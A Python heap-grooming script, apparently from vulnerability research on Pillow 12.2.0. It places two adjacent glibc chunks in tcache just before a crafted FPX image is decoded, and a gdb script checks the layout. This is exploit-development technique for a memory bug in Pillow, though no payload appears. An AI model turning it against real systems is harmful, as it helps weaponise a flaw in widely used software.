"""W13: groom adjacent glibc chunks, then load the crafted FPX case.

Usage: PYTHONPATH=<plain-pillow-12.2.0> python3 groom_tcache.py CASE.fpx SIZE
The two adjacent chunks are freed only after Image.open(), immediately before
load(), so Image.open() cannot consume them first.  gdb script tcache_place.gdb
checks whether either is still in tcache when ImagingJpegDecode is entered.
"""

import ctypes
import os
import sys

libc = ctypes.CDLL(None)
libc.malloc.restype = ctypes.c_void_p
libc.malloc.argtypes = [ctypes.c_size_t]
libc.free.argtypes = [ctypes.c_void_p]

sz = int(sys.argv[2]) if len(sys.argv) > 2 else 128
delta = ((sz + 8 + 15) // 16) * 16
ptrs = [libc.malloc(sz) for _ in range(64)]
srt = sorted(ptrs)
pair = next(
    ((srt[i], srt[i + 1]) for i in range(len(srt) - 1) if srt[i + 1] - srt[i] == delta),
    None,
)
if pair is None:
    raise SystemExit("NO_ADJACENT_PAIR")
x, y = pair
os.environ["GROOM_X"] = "%x" % x
os.environ["GROOM_Y"] = "%x" % y
print("GROOM sz=%d x=%x y=%x delta=%d" % (sz, x, y, y - x), flush=True)

from PIL import Image

im = Image.open(sys.argv[1])
libc.free(ctypes.c_void_p(y))
libc.free(ctypes.c_void_p(x))
im.load()
print("LOAD_OK", flush=True)
